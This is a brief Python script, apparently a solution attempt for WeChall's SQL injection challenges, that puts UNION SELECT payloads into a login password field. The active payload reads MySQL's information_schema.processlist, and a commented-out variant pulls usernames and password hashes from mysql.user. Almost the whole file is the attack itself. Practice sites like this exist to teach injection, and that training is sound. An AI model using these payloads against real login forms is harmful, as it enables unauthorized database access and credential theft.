import requests

username = "test"
password = "' union select DB,HOST,INFO from information_schema.processlist; %23"
#password = "' select User,Password from mysql.user; %23"
# Three coloumns (username, password, message)
url2 = "https://www.wechall.net/challenge/nurfed/more_table_names/challenge.php?usernme=%s&password=%s&login=login" % (username, password)
url = "https://www.wechall.net/challenge/table_names/challenge.php?username=%s&password=%s&login=login" % (username, password)
r = requests.get(url2)
print r.text
print r.headers
